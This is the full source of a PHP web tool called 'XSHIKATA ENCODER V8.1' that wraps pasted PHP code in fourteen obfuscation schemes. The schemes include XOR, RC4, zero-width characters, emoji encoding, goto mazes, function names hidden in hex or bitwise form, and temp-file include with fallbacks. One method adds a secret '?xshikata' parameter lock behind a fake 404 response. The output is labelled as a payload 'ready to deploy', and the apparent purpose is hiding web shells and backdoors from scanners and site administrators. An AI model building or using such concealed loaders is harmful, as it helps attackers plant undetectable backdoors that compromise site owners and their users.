<?php
/*
    XSHIKATA ENCODER V8.1 (MODIFIED)
    UI: Cyberpunk V1 (Responsive)
    Changes: 
    - No Comments in Output (1-14)
    - Method 14 Fixed Lock: ?xshikata
    - Method 9 & 11: Function Names Hidden
    - Method 9, 11, 12, 13, 14: Added 'file_put_contents' Fallback (fopen/fwrite)
*/

$result = "";
$error = "";

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $code = $_POST['code'];
    $method = $_POST['method'];

    if (empty($code)) {
        $error = "Input code cannot be empty!";
    } else {
        // 1. BERSIHKAN TAG PHP
        $clean_code = trim($code);
        $clean_code = preg_replace('/^<\?php\s*/i', '', $clean_code);
        $clean_code = preg_replace('/\?>$/', '', $clean_code);
        $clean_code = trim($clean_code);

        // ======================================================
        // METHOD 1: MATHEMATICAL SHIFT
        // ======================================================
        if ($method == 'math') {
            $key = "xshikata";
            $key_len = strlen($key);
            $encoded_array = [];
            for ($i = 0; $i < strlen($clean_code); $i++) {
                $encoded_array[] = (ord($clean_code[$i]) + ord($key[$i % $key_len])) * 3;
            }
            $payload = implode('.', $encoded_array);
            $decoder = 'function xshikata($d){$k="xshikata";$p=explode(".",$d);$o="";$l=strlen($k);$i=0;foreach($p as $v){if($v==""||!is_numeric($v))continue;$o.=chr(($v/3)-ord($k[$i%$l]));$i++;}eval($o);}';
            $result = '<?php' . "\n" . $decoder . "\n" . 'xshikata(\'' . $payload . '\');' . "\n" . '?>';
        }

        // ======================================================
        // METHOD 2: QUANTUM GZIP
        // ======================================================
        elseif ($method == 'gzip') {
            $compressed = gzdeflate($clean_code, 9);
            $payload = base64_encode($compressed);
            $decoder = 'function xshikata($z){$b=base64_decode($z);$c=gzinflate($b);if($c)eval($c);}';
            $result = '<?php' . "\n" . $decoder . "\n" . 'xshikata(\'' . $payload . '\');' . "\n" . '?>';
        }

        // ======================================================
        // METHOD 3: BINARY XOR
        // ======================================================
        elseif ($method == 'xor') {
            $key = substr(md5(time()), 0, 8);
            $xor_res = "";
            for($i=0; $i<strlen($clean_code); $i++) {
                $xor_res .= $clean_code[$i] ^ $key[$i % 8];
            }
            $payload = base64_encode($xor_res);
            $decoder = 'function xshikata($x){$k="' . $key . '";$d=base64_decode($x);$o="";for($i=0;$i<strlen($d);$i++){$o.=$d[$i]^$k[$i%8];}eval($o);}';
            $result = '<?php' . "\n" . $decoder . "\n" . 'xshikata(\'' . $payload . '\');' . "\n" . '?>';
        }

        // ======================================================
        // METHOD 4: RC4 GHOST
        // ======================================================
        elseif ($method == 'rc4') {
            $key = md5(microtime());
            $s = array(); for($i=0;$i<256;$i++){$s[$i]=$i;}
            $j = 0;
            for($i=0;$i<256;$i++){
                $j = ($j + $s[$i] + ord($key[$i % strlen($key)])) % 256;
                $temp = $s[$i]; $s[$i] = $s[$j]; $s[$j] = $temp;
            }
            $i = 0; $j = 0; $res = '';
            for($y=0;$y<strlen($clean_code);$y++){
                $i = ($i + 1) % 256;
                $j = ($j + $s[$i]) % 256;
                $temp = $s[$i]; $s[$i] = $s[$j]; $s[$j] = $temp;
                $res .= $clean_code[$y] ^ chr($s[($s[$i] + $s[$j]) % 256]);
            }
            $payload = base64_encode($res);
            $decoder = 'function xshikata($d,$k){$s=range(0,255);$j=0;for($i=0;$i<256;$i++){$j=($j+$s[$i]+ord($k[$i%strlen($k)]))%256;$t=$s[$i];$s[$i]=$s[$j];$s[$j]=$t;}$i=0;$j=0;$r="";$d=base64_decode($d);for($y=0;$y<strlen($d);$y++){$i=($i+1)%256;$j=($j+$s[$i])%256;$t=$s[$i];$s[$i]=$s[$j];$s[$j]=$t;$r.=$d[$y]^chr($s[($s[$i]+$s[$j])%256]);}eval($r);}';
            $result = '<?php' . "\n" . $decoder . "\n" . 'xshikata(\'' . $payload . '\', \'' . $key . '\');' . "\n" . '?>';
        }

        // ======================================================
        // METHOD 5: INVISIBLE INK
        // ======================================================
        elseif ($method == 'invisible') {
            $bin = '';
            for($i=0; $i<strlen($clean_code); $i++) {
                $bin .= sprintf("%08d", decbin(ord($clean_code[$i])));
            }
            $payload = str_replace(['0', '1'], ["\xE2\x80\x8B", "\xE2\x80\x8C"], $bin);
            $decoder = 'function xshikata($s){$b=str_replace(["\xE2\x80\x8B","\xE2\x80\x8C"],["0","1"],$s);$o="";for($i=0;$i<strlen($b);$i+=8){$o.=chr(bindec(substr($b,$i,8)));}eval($o);}';
            $result = '<?php' . "\n" . $decoder . "\n" . 'xshikata("' . $payload . '");' . "\n" . '?>';
        }

        // ======================================================
        // METHOD 6: EMOJI CRYPT
        // ======================================================
        elseif ($method == 'emoji') {
            $hex = bin2hex($clean_code);
            $map = ['0'=>'🌑','1'=>'🌒','2'=>'🌓','3'=>'🌔','4'=>'🌕','5'=>'🌖','6'=>'🌗','7'=>'🌘','8'=>'🌙','9'=>'🌚','a'=>'🌛','b'=>'🌜','c'=>'🌝','d'=>'🌞','e'=>'⭐','f'=>'🌟'];
            $payload = strtr($hex, $map);
            $decoder = 'function xshikata($e){$m=["🌑"=>"0","🌒"=>"1","🌓"=>"2","🌔"=>"3","🌕"=>"4","🌖"=>"5","🌗"=>"6","🌘"=>"7","🌙"=>"8","🌚"=>"9","🌛"=>"a","🌜"=>"b","🌝"=>"c","🌞"=>"d","⭐"=>"e","🌟"=>"f"];$h=strtr($e,$m);eval(pack("H*",$h));}';
            $result = '<?php' . "\n" . $decoder . "\n" . 'xshikata(\'' . $payload . '\');' . "\n" . '?>';
        }

        // ======================================================
        // METHOD 7: SWITCH-CASE STATE MACHINE
        // ======================================================
        elseif ($method == 'switch') {
            $chunk_size = 8;
            $chunks = str_split($clean_code, $chunk_size);
            $ids = [];
            for($i=0; $i<=count($chunks); $i++) { $ids[] = mt_rand(100000, 999999); }
            $cases = [];
            for ($i = 0; $i < count($chunks); $i++) {
                $curr_id = $ids[$i];
                $next_id = $ids[$i+1];
                $hex_chunk = '';
                for ($j = 0; $j < strlen($chunks[$i]); $j++) { $hex_chunk .= '\x' . bin2hex($chunks[$i][$j]); }
                $cases[] = "case $curr_id: \$o.=\"$hex_chunk\"; \$s=$next_id; break;";
            }
            $last_id = end($ids);
            $cases[] = "case $last_id: eval(\$o); break 2;";
            shuffle($cases);
            $start_id = $ids[0];
            $switch_block = implode("\n", $cases);
            $decoder = "\$s=$start_id; \$o=\"\"; while(true) { switch(\$s) { $switch_block } }";
            $result = "<?php\n$decoder\n?>";
        }

        // ======================================================
        // METHOD 8: GOTO STEALTH (EVAL)
        // ======================================================
        elseif ($method == 'goto') {
            $chunk_size = 12;
            $chunks = str_split($clean_code, $chunk_size);
            $var_name = '$' . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 5); 
            $labels = [];
            for($i=0; $i<=count($chunks); $i++) { $labels[] = '_' . strtoupper(uniqid()); }
            $blocks = [];
            for ($i = 0; $i < count($chunks); $i++) {
                $curr_label = $labels[$i];
                $next_label = $labels[$i+1];
                $hex_chunk = '';
                for ($j = 0; $j < strlen($chunks[$i]); $j++) { $hex_chunk .= '\x' . bin2hex($chunks[$i][$j]); }
                $blocks[] = "$curr_label: $var_name.=\"$hex_chunk\"; goto $next_label;";
            }
            shuffle($blocks);
            $start_label = $labels[0];
            $end_label = end($labels);
            $header = "$var_name=''; goto $start_label;";
            $body = implode("\n", $blocks);
            $footer = "$end_label: eval($var_name);";
            $result = "<?php\nerror_reporting(0);\n$header\n$body\n$footer\n?>";
        }

        // ======================================================
        // METHOD 9: GOTO STEALTH (NO EVAL + HIDDEN FUNC + FALLBACK)
        // ======================================================
        elseif ($method == 'goto_noeval') {
            $full_payload = "<?php\n" . $clean_code . "\n?>";
            $chunk_size = 10;
            $chunks = str_split($full_payload, $chunk_size);
            $var_name = '$' . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 6); 
            
            // Random variable names for obfuscated functions
            $v_sys = '$' . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 5);
            $v_tmp = '$' . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 5);
            $v_fpc = '$' . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 5);
            $v_unl = '$' . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 5);
            $v_fop = '$' . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 5);
            $v_fwr = '$' . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 5);
            $v_fcl = '$' . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 5);
            $v_path = '$' . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 6);
            $v_hand = '$' . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 4);

            $hex_sys = bin2hex('sys_get_temp_dir');
            $hex_tmp = bin2hex('tempnam');
            $hex_fpc = bin2hex('file_put_contents');
            $hex_unl = bin2hex('unlink');
            $hex_fop = bin2hex('fopen');
            $hex_fwr = bin2hex('fwrite');
            $hex_fcl = bin2hex('fclose');

            $labels = [];
            for($i=0; $i<=count($chunks); $i++) { $labels[] = 'L' . mt_rand(1000,9999) . strtoupper(uniqid()); }
            $blocks = [];
            for ($i = 0; $i < count($chunks); $i++) {
                $curr_label = $labels[$i];
                $next_label = $labels[$i+1];
                $hex_chunk = '';
                for ($j = 0; $j < strlen($chunks[$i]); $j++) { $hex_chunk .= '\x' . bin2hex($chunks[$i][$j]); }
                $blocks[] = "$curr_label: $var_name.=\"$hex_chunk\"; goto $next_label;";
            }
            shuffle($blocks);
            $start_label = $labels[0];
            $end_label = end($labels);
            
            // Setup obfuscated variables
            $setup = "$v_sys=hex2bin('$hex_sys');$v_tmp=hex2bin('$hex_tmp');$v_fpc=hex2bin('$hex_fpc');$v_unl=hex2bin('$hex_unl');$v_fop=hex2bin('$hex_fop');$v_fwr=hex2bin('$hex_fwr');$v_fcl=hex2bin('$hex_fcl');";
            
            $header = "$setup $var_name=''; goto $start_label;";
            $body = implode("\n", $blocks);
            
            // Footer with fallback logic
            $footer_logic = "
                $v_path = $v_tmp($v_sys(), 'x');
                if(function_exists($v_fpc)){
                    $v_fpc($v_path, $var_name);
                } else {
                    $v_hand = $v_fop($v_path, 'w');
                    $v_fwr($v_hand, $var_name);
                    $v_fcl($v_hand);
                }
                include($v_path);
                $v_unl($v_path);
            ";
            $footer = "$end_label: " . trim(preg_replace('/\s+/', ' ', $footer_logic));
            
            $result = "<?php\nerror_reporting(0);\n$header\n$body\n$footer\n?>";
        }

        // ======================================================
        // METHOD 10: GOTO NATIVE
        // ======================================================
        elseif ($method == 'goto_native') {
            // Note: Method 10 does not use file writing (no file_put_contents), so no fallback needed.
            $tokens = token_get_all("<?php " . $clean_code);
            $obfuscated_code = '';
            foreach ($tokens as $token) {
                if (is_array($token)) {
                    $id = $token[0]; $text = $token[1];
                    if ($id === T_COMMENT || $id === T_DOC_COMMENT) { continue; }
                    if ($id === T_CONSTANT_ENCAPSED_STRING) {
                        $raw_str = substr($text, 1, -1); $encoded_str = '';
                        for ($i = 0; $i < strlen($raw_str); $i++) {
                            $ord = ord($raw_str[$i]);
                            if (mt_rand(0, 1)) { $encoded_str .= '\\x' . dechex($ord); } 
                            else { $encoded_str .= '\\' . decoct($ord); }
                        }
                        $obfuscated_code .= '"' . $encoded_str . '"'; continue;
                    }
                    $obfuscated_code .= $text;
                } else { $obfuscated_code .= $token; }
            }
            $obfuscated_code = preg_replace('/^<\?php\s*/i', '', trim($obfuscated_code));
            $label_start = "xshikata_" . substr(md5(time()), 0, 4);
            $label_code  = "L" . substr(str_shuffle('ABCDEFGHIJKLMNOPQRSTUVWXYZ'), 0, 5);
            $label_end   = "E" . substr(str_shuffle('ABCDEFGHIJKLMNOPQRSTUVWXYZ'), 0, 5);
            $result = "<?php\n goto $label_start; $label_code: $obfuscated_code goto $label_end; $label_start: goto $label_code; $label_end: \n?>";
        }

        // ======================================================
        // METHOD 11: OOP DESTRUCTOR (HIDDEN FUNC + FALLBACK)
        // ======================================================
        elseif ($method == 'oop') {
            $var_name = "X" . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 4);
            $prop_name = "_" . substr(md5(time()), 0, 4);
            $payload_ready = "<?php " . $clean_code . " ?>";
            $hex_payload = bin2hex($payload_ready);
            
            // Hex encoded function names
            $hex_sys = bin2hex('sys_get_temp_dir');
            $hex_tmp = bin2hex('tempnam');
            $hex_fpc = bin2hex('file_put_contents');
            $hex_unl = bin2hex('unlink');
            $hex_fop = bin2hex('fopen');
            $hex_fwr = bin2hex('fwrite');
            $hex_fcl = bin2hex('fclose');

            $class_code = "
            class $var_name { 
                private $$prop_name = '$hex_payload'; 
                public function __destruct() { 
                    \$c = hex2bin(\$this->$prop_name); 
                    \$sy = hex2bin('$hex_sys');
                    \$tm = hex2bin('$hex_tmp');
                    \$fp = hex2bin('$hex_fpc');
                    \$un = hex2bin('$hex_unl');
                    \$t = \$tm(\$sy(), 'pk'); 
                    
                    if(function_exists(\$fp)) {
                        \$fp(\$t, \$c);
                    } else {
                        \$fo = hex2bin('$hex_fop');
                        \$fw = hex2bin('$hex_fwr');
                        \$fc = hex2bin('$hex_fcl');
                        \$h = \$fo(\$t, 'w');
                        \$fw(\$h, \$c);
                        \$fc(\$h);
                    }
                    
                    include(\$t); 
                    \$un(\$t); 
                } 
            } 
            new $var_name();";
            
            $class_code = trim(preg_replace('/\s+/', ' ', $class_code));
            $result = "<?php\n$class_code\n?>";
        }

        // ======================================================
        // METHOD 12: DYNAMIC FUNCTION MAPPING (WITH FALLBACK)
        // ======================================================
        elseif ($method == 'dynamic_call') {
            $payload_ready = "<?php " . $clean_code . " ?>";
            $hex_payload = bin2hex($payload_ready);
            $v_payload = '$' . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 4);
            $v_path = '$' . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 5);
            $v_func_write = '$' . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 6);
            $v_func_unlk = '$' . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 6);
            $v_func_fopen = '$' . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 6);
            $v_func_fwrite = '$' . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 6);
            $v_func_fclose = '$' . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 6);
            
            $hex_fpc = bin2hex('file_put_contents');
            $hex_unl = bin2hex('unlink');
            $hex_fop = bin2hex('fopen');
            $hex_fwr = bin2hex('fwrite');
            $hex_fcl = bin2hex('fclose');
            
            $final_logic = "
            $v_payload=hex2bin('$hex_payload');
            $v_func_write=hex2bin('$hex_fpc');
            $v_func_unlk=hex2bin('$hex_unl');
            $v_path=tempnam(sys_get_temp_dir(),'gc');
            
            if(function_exists($v_func_write)) {
                $v_func_write($v_path,$v_payload);
            } else {
                $v_func_fopen=hex2bin('$hex_fop');
                $v_func_fwrite=hex2bin('$hex_fwr');
                $v_func_fclose=hex2bin('$hex_fcl');
                \$h = $v_func_fopen($v_path, 'w');
                $v_func_fwrite(\$h, $v_payload);
                $v_func_fclose(\$h);
            }
            
            include($v_path);
            $v_func_unlk($v_path);";
            
            $final_logic = trim(preg_replace('/\s+/', '', $final_logic));
            $result = "<?php\n$final_logic\n?>";
        }

        // ======================================================
        // METHOD 13: BITWISE INVERSION (NO-FUNC DECODE + FALLBACK)
        // ======================================================
        elseif ($method == 'bitwise') {
            $funcs = ['file_put_contents', 'unlink', 'tempnam', 'sys_get_temp_dir', 'fopen', 'fwrite', 'fclose'];
            $vars = [];
            foreach($funcs as $f) { $vars[$f] = '$' . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 5); }
            $v_path = '$' . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 4);
            $v_payload = '$' . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 4);
            $v_handle = '$' . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 4);
            $payload_ready = "<?php " . $clean_code . " ?>";
            $encoded_payload = ~$payload_ready;
            
            if (!function_exists('safe_escape')) {
                function safe_escape($str) {
                    $out = ''; for ($i = 0; $i < strlen($str); $i++) { $out .= '\x' . bin2hex($str[$i]); } return $out;
                }
            }
            
            $str_fpc = safe_escape(~$funcs[0]);
            $str_unl = safe_escape(~$funcs[1]);
            $str_tmp = safe_escape(~$funcs[2]);
            $str_sys = safe_escape(~$funcs[3]);
            $str_fop = safe_escape(~$funcs[4]);
            $str_fwr = safe_escape(~$funcs[5]);
            $str_fcl = safe_escape(~$funcs[6]);
            $str_pay = safe_escape($encoded_payload);
            
            $logic = "
$vars[file_put_contents] = ~\"$str_fpc\";
$vars[unlink] = ~\"$str_unl\";
$vars[tempnam] = ~\"$str_tmp\";
$vars[sys_get_temp_dir] = ~\"$str_sys\";
$vars[fopen] = ~\"$str_fop\";
$vars[fwrite] = ~\"$str_fwr\";
$vars[fclose] = ~\"$str_fcl\";
$v_payload = ~\"$str_pay\";

$v_path = {$vars['tempnam']}({$vars['sys_get_temp_dir']}(), 'bw');

if(function_exists({$vars['file_put_contents']})) {
    {$vars['file_put_contents']}($v_path, $v_payload);
} else {
    $v_handle = {$vars['fopen']}($v_path, 'w');
    {$vars['fwrite']}($v_handle, $v_payload);
    {$vars['fclose']}($v_handle);
}

include($v_path);
{$vars['unlink']}($v_path);
";
            $logic = trim(preg_replace('/\s+/', '', $logic));
            $logic = str_replace(';', '; ', $logic);
            $result = "<?php\n$logic\n?>";
        }

        // ======================================================
        // METHOD 14: HYBRID STEALTH (BITWISE + XOR + LOCK + FALLBACK)
        // ======================================================
        elseif ($method == 'hybrid') {
            // 1. Setup Keys
            $lock_param = 'xshikata'; // FIXED KEY
            $xor_key = substr(md5(time()), 0, 8);
            
            // 2. Prepare Payload (XOR -> Bitwise NOT)
            $raw_payload = "<?php " . $clean_code . " ?>";
            $xored = '';
            for($i=0; $i<strlen($raw_payload); $i++) {
                $xored .= $raw_payload[$i] ^ $xor_key[$i % 8];
            }
            $encoded_payload = ~$xored;

            // 3. Prepare Dynamic Vars
            $funcs = ['file_put_contents', 'unlink', 'tempnam', 'sys_get_temp_dir', 'fopen', 'fwrite', 'fclose'];
            $vars = [];
            foreach($funcs as $f) { $vars[$f] = '$' . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 5); }
            $v_path = '$' . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 4);
            $v_pay  = '$' . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 4);
            $v_lock_name = '$' . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 4);
            $v_hand = '$' . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 4);
            
            if (!function_exists('safe_escape')) {
                function safe_escape($str) {
                    $out = ''; for ($i = 0; $i < strlen($str); $i++) { $out .= '\x' . bin2hex($str[$i]); } return $out;
                }
            }

            $str_fpc = safe_escape(~$funcs[0]);
            $str_unl = safe_escape(~$funcs[1]);
            $str_tmp = safe_escape(~$funcs[2]);
            $str_sys = safe_escape(~$funcs[3]);
            $str_fop = safe_escape(~$funcs[4]);
            $str_fwr = safe_escape(~$funcs[5]);
            $str_fcl = safe_escape(~$funcs[6]);
            $str_lck = safe_escape(~$lock_param);
            $str_pay = safe_escape($encoded_payload);

            // 4. Construct Decoder (FIXED SYNTAX)
            $logic = "
{$vars['file_put_contents']} = ~\"$str_fpc\";
{$vars['unlink']} = ~\"$str_unl\";
{$vars['tempnam']} = ~\"$str_tmp\";
{$vars['sys_get_temp_dir']} = ~\"$str_sys\";
{$vars['fopen']} = ~\"$str_fop\";
{$vars['fwrite']} = ~\"$str_fwr\";
{$vars['fclose']} = ~\"$str_fcl\";

$v_lock_name = ~\"$str_lck\";
if(!isset(\$_GET[$v_lock_name])){header('HTTP/1.0 404 Not Found');die();}
$v_pay = ~\"$str_pay\";
for(\$i=0;\$i<strlen($v_pay);\$i++){\$j=\$i%8;{$v_pay}[\$i]={$v_pay}[\$i]^\"$xor_key\"[\$j];}
$v_path = {$vars['tempnam']}({$vars['sys_get_temp_dir']}(),'hb');

if(function_exists({$vars['file_put_contents']})){
    {$vars['file_put_contents']}($v_path, $v_pay);
} else {
    $v_hand = {$vars['fopen']}($v_path, 'w');
    {$vars['fwrite']}($v_hand, $v_pay);
    {$vars['fclose']}($v_hand);
}

include($v_path);
{$vars['unlink']}($v_path);
";
            $logic = trim(preg_replace('/\s+/', ' ', $logic)); 
            
            $result = "<?php\n/* Usage: ?xshikata */\n$logic\n?>";
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XSHIKATA V8.1 FINAL</title>
    <style>
        :root {
            --bg: #0d1117;
            --panel: #161b22;
            --border: #30363d;
            --accent: #238636;
            --text: #c9d1d9;
            --code: #58a6ff;
            --neon: #00ff00;
        }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            background-color: var(--bg);
            color: var(--text);
            font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
            display: flex;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            width: 100%;
            max-width: 900px;
        }
        .header {
            text-align: center;
            margin-bottom: 30px;
            border-bottom: 2px solid var(--accent);
            padding-bottom: 15px;
        }
        h1 { color: var(--neon); letter-spacing: 2px; text-shadow: 0 0 10px rgba(0,255,0,0.3); }
        .box {
            background: var(--panel);
            border: 1px solid var(--border);
            border-radius: 8px;
            padding: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
        }
        textarea {
            width: 100%;
            background: #000;
            color: #0f0;
            border: 1px solid var(--border);
            border-radius: 4px;
            padding: 15px;
            font-family: inherit;
            font-size: 14px;
            resize: vertical;
            outline: none;
        }
        textarea:focus { border-color: var(--code); }
        .controls {
            display: flex;
            gap: 15px;
            margin-top: 15px;
            align-items: center;
        }
        select, button {
            padding: 12px 20px;
            border-radius: 4px;
            font-weight: bold;
            cursor: pointer;
            font-family: inherit;
        }
        select {
            background: var(--bg);
            color: white;
            border: 1px solid var(--border);
            flex: 1;
        }
        button.btn-main {
            background: var(--accent);
            color: white;
            border: none;
            flex: 1;
            transition: 0.3s;
        }
        button.btn-main:hover { background: #2ea043; box-shadow: 0 0 15px rgba(46, 160, 67, 0.4); }
        
        .result-area {
            margin-top: 30px;
            animation: fadeIn 0.5s ease;
        }
        .copy-btn {
            background: #1f6feb;
            color: white;
            border: none;
            padding: 8px 15px;
            float: right;
            margin-bottom: 5px;
            font-size: 12px;
        }
        .label { color: #8b949e; font-size: 12px; margin-bottom: 5px; display: block; }
        
        @keyframes fadeIn { from { opacity:0; transform:translateY(10px); } to { opacity:1; transform:translateY(0); } }
        .error { color: #ff5555; margin-bottom: 10px; }

        @media (max-width: 768px) {
            body { padding: 10px; }
            .header h1 { font-size: 1.5rem; }
            .controls { flex-direction: column; align-items: stretch; }
            select, button.btn-main { width: 100%; margin-bottom: 5px; }
            textarea { font-size: 12px; padding: 10px; }
            .box { padding: 15px; }
        }
    </style>
</head>
<body>

<div class="container">
    <div class="header">
        <h1>[ XSHIKATA ENCODER V8.1 ]</h1>
        <p style="color:#8b949e; font-size:12px; margin-top:5px;">HIDDEN FUNCTIONS & FALLBACK ADDED</p>
    </div>

    <div class="box">
        <?php if($error): ?>
            <div class="error">ERROR: <?php echo $error; ?></div>
        <?php endif; ?>

        <form method="POST">
            <span class="label">PASTE PHP CODE (FULL SOURCE):</span>
            <textarea name="code" rows="12" placeholder="<?php echo "<?php\n// Paste code here...\n?>"; ?>"></textarea>
            
            <div class="controls">
                <select name="method">
                    <option value="math">METHOD 1: Math Shift (Classic)</option>
                    <option value="gzip">METHOD 2: Quantum Gzip (Short)</option>
                    <option value="xor">METHOD 3: Binary XOR (Strong)</option>
                    <option value="rc4">METHOD 4: RC4 Ghost (Military Grade)</option>
                    <option value="invisible">METHOD 5: Invisible Ink (Stealth)</option>
                    <option value="emoji">METHOD 6: Emoji Crypt (Visual)</option>
                    <option value="switch">METHOD 7: Switch-Case Machine (No Base64)</option>
                    <option value="goto">METHOD 8: Goto Stealth (With Eval)</option>
                    <option value="goto_noeval">METHOD 9: Goto Stealth (No Eval + Hidden + Fallback)</option>
                    <option value="goto_native">METHOD 10: Goto Native (Mixed Strings)</option>
                    <option value="oop">METHOD 11: OOP Destructor (Ghost Class + Fallback)</option>
                    <option value="dynamic_call">METHOD 12: Dynamic Function Mapping (Fallback)</option>
                    <option value="bitwise">METHOD 13: Bitwise Inversion (Fallback)</option>
                    <option value="hybrid" style="color:red; font-weight:bold;">METHOD 14: Hybrid Stealth (Lock: ?xshikata)</option>
                </select>
                <button type="submit" class="btn-main">ENCODE PAYLOAD</button>
            </div>
        </form>
    </div>

    <?php if ($result): ?>
    <div class="result-area">
        <button onclick="copyResult()" class="copy-btn">COPY CODE</button>
        <span class="label" style="color:var(--neon)">ENCRYPTION SUCCESSFUL (READY TO DEPLOY):</span>
        <textarea id="out" rows="15" readonly><?php echo htmlspecialchars($result); ?></textarea>
    </div>
    <script>
        function copyResult() {
            var t=document.getElementById('out');
            t.select(); t.setSelectionRange(0,99999);
            navigator.clipboard.writeText(t.value);
            alert('Code Copied!');
        }
    </script>
    <?php endif; ?>
    
    <div style="text-align:center; margin-top:30px; color:#30363d; font-size:11px;">
        XSHIKATA V8.1 | MODIFIED EDITION
    </div>
</div>

</body>
</html>
